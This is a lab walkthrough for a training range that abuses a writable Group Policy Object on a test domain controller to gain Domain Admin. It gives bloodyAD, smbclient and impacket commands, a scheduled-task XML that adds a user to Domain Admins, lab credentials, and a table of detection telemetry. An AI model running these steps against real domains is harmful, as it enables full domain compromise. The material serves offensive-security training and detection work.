# WT#023 — GPO Abuse (Vulnerable-GPO)

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01.cadre.local) |
| **Domain** | cadre.local |
| **Starting Credential** | analyst_cloud / Cl0ud_An@lyst! |
| **Tools Required** | bloodyAD, impacket, ldapdomaindump |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1484.001 |
| **Difficulty** | Medium |

## Prerequisites
- `analyst_cloud` user with `GpoEditDeleteModifySecurity` permission on `Vulnerable-GPO` (pre-configured in CADRE)
- `Vulnerable-GPO` linked to `OU=Command,dc=cadre,dc=local`
- `chief_command` (C0mm@nd_Ch1ef!) is a member of `OU=Command` and `Domain Admins`
- Network connectivity from Kali (192.168.77.41) to dc01 (192.168.77.10)

## Attack Steps

### Step 1: Enumerate the GPO and confirm permissions
```bash
# Find Vulnerable-GPO DN:
ldapsearch -H ldap://dc01.cadre.local -D "analyst_cloud@cadre.local" -w "Cl0ud_An@lyst!" -b "CN=Policies,CN=System,DC=cadre,DC=local" "(displayName=Vulnerable-GPO)" dn

# Example output:
# CN={GPO-GUID},CN=Policies,CN=System,DC=cadre,DC=local
```

### Step 2: Modify the GPO to add an Immediate Task
Use bloodyAD to write the malicious `gpcUserExtensionNames` and associated scheduled task XML.

```bash
# Set the GPO to add an immediate scheduled task that runs as chief_command:
bloodyAD --host dc01.cadre.local -d cadre.local -u analyst_cloud -p "Cl0ud_An@lyst!" set object "CN={GPO-GUID},CN=Policies,CN=System,DC=cadre,DC=local" gpcUserExtensionNames -v "[{D02B1F71-2BA7-4B33-A5F1-3EAB61A74B71}{D02B1F71-2BA7-4B33-A5F1-3EAB61A74B71}]"
```

### Step 3: Create the scheduled task XML in the GPO's Machine folder
```bash
# Create the immediate task XML:
cat > immediate-task.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTask xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>CADRE GPO Abuse</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-<DOMAIN-SID>-<chief_command_RID></UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-Command "net group 'Domain Admins' analyst_cloud /add /domain"</Arguments>
    </Exec>
  </Actions>
</ScheduledTask>
EOF

# Upload the task XML to the GPO's Machine folder via SMB:
smbclient //dc01.cadre.local/SYSVOL -U "cadre.local\\analyst_cloud" -c "put immediate-task.xml \"cadre.local/Policies/{GPO-GUID}/Machine/ScheduledTasks/immediate-task.xml\""
```

### Step 4: Restart the target computer (chief_command workstation or wait for gpupdate)
```bash
# Force gpupdate on a target in OU=Command, or wait for the 90-minute refresh cycle:
impacket-wmiexec cadre.local/analyst_cloud:"Cl0ud_An@lyst!"@dc01.cadre.local
# Inside the shell:
gpupdate /target:computer /force
```

### Step 5: Alternative — modify GPO startup script instead
```bash
# Simpler approach: modify the GPO's startup script via SYSVOL:
smbclient //dc01.cadre.local/SYSVOL -U "cadre.local\\analyst_cloud"
# cd cadre.local/Policies/{GPO-GUID}/Machine/Scripts/Startup
# put malicious_startup.ps1
```

### Step 6: Verify code execution as chief_command
```bash
# Add analyst_cloud to Domain Admins:
net group "Domain Admins" analyst_cloud /add /domain

# Verify:
net group "Domain Admins" /domain
```

## Post-Exploitation Chain
- analyst_cloud added to Domain Admins → full domain compromise
- Can also use the GPO to install a backdoor, exfiltrate data, or add a Golden Certificate template
- The abused GPO modification persists until cleaned up by a domain admin

## Telemetry Verification
| Source | What to look for |
|--------|-----------------|
| **Windows Security (dc01)** | Event 5136 (GPO object modification in AD), Event 4698 (scheduled task creation) |
| **Sysmon (dc01)** | Event 11 (FileCreate — SYSVOL task XML written), Event 1 (powershell from scheduled task) |
| **Windows Security (target member)** | Event 4698 (immediate task triggered), Event 4688 (powershell as chief_command) |
| **Zeek (monitor)** | `smb_files.log` (SYSVOL write), `ldap.log` (GPO attribute modification) |
| **Suricata (monitor)** | SMB write to SYSVOL share alerts |
| **Elastic / Kibana** | `logs-system.security-*`, `logs-windows.sysmon_operational-*`, `logs-windows.powershell-*` |
| **Velociraptor** | `Windows.TaskScheduler` artifact to find malicious scheduled task, `Windows.Sys.Users` for new Domain Admin |

## Status
**CONFIGURED** — Vulnerable-GPO exists, linked to OU=Command, with analyst_cloud delegated GpoEditDeleteModifySecurity.
